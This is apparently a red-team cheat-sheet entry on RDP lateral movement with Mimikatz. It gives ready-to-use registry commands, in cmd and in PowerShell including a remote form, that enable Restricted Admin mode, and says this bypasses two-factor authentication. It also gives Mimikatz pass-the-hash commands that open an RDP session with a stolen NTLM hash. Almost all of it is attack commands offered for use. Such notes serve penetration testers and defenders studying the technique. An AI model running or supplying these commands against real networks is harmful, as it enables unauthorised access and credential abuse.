---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - lateral-movement
  - offensive-tools
  - T1021-001
  - network-protocols
  - rdp
  - windows
---
# Mimikatz

## 01 - Enable Restricted Admin Mode

> [!IMPORTANT] Conditions
> Enable restricted admin mode.
>> [!INFO]
>> This is will bypass 2FA (two factor authentication) if it was configured in enterprise networks. It allows RDP authentication with Pass The Hash methods.

### 1.1 - Command Prompt

```
C:\> reg.exe add [\\<IP>\]HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

### 1.2 - PowerShell

```
PS C:\> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD -Force

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD -Force }
```

## 02 - Run RDP Remote Session 

After passing the hash. Create a new process to authenticate RDP. This is much easier to do.

```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<nt_hash>

mimikatz # process::start "mstsc.exe /v:<IP> /noConsentPrompt /restrictedadmin"
```

You can do this in one-liner.

```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<nt_hash> /run:"mstsc.exe /v:<IP> /noConsentPrompt /restrictedadmin"
```

---
## References

### LOLRMM

- [LOLRMM: Microsoft RDP](https://lolrmm.io/tools/microsoft_rdp)

- [LOLRMM: Microsoft TSC](https://lolrmm.io/tools/microsoft_tsc)

- [LOLRMM: mstsc](https://lolrmm.io/tools/mstsc)

### ederml

- [ederml: Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)